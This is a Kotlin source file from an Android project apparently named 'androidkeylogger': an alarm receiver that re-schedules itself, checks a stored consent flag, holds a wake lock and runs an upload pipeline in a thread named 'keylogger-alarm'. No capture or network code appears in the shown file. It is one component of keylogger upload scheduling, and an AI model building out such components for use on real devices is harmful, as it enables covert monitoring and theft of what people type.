package com.bshu2.androidkeylogger

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log

/** Alarm target: re-arms first, then runs the pipeline under a wake lock. */
class UploadReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        Log.d(UploadPipeline.TAG, "alarm received: ${intent?.action}")
        AlarmScheduler.schedule(context)
        if (!Prefs.hasConsent(context)) {
            Log.d(UploadPipeline.TAG, "no consent recorded; skipping pipeline")
            return
        }
        val app = context.applicationContext
        val lock = acquireWakeLock(app)
        Thread({
            try {
                UploadPipeline.run(app)
            } catch (e: Exception) {
                Log.e(UploadPipeline.TAG, "scheduled upload failed", e)
            } finally {
                if (lock != null && lock.isHeld) {
                    try {
                        lock.release()
                    } catch (_: Exception) {
                    }
                }
            }
        }, "keylogger-alarm").start()
    }

    private fun acquireWakeLock(ctx: Context): PowerManager.WakeLock? {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return null
        return try {
            val lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "keylogger:upload")
            lock.setReferenceCounted(false)
            lock.acquire(WAKE_LOCK_TIMEOUT_MS)
            lock
        } catch (e: Exception) {
            Log.e(UploadPipeline.TAG, "could not acquire wake lock", e)
            null
        }
    }

    companion object {
        const val ACTION_UPLOAD = "com.bshu2.androidkeylogger.action.UPLOAD"
        private const val WAKE_LOCK_TIMEOUT_MS = 5L * 60L * 1000L
    }
}
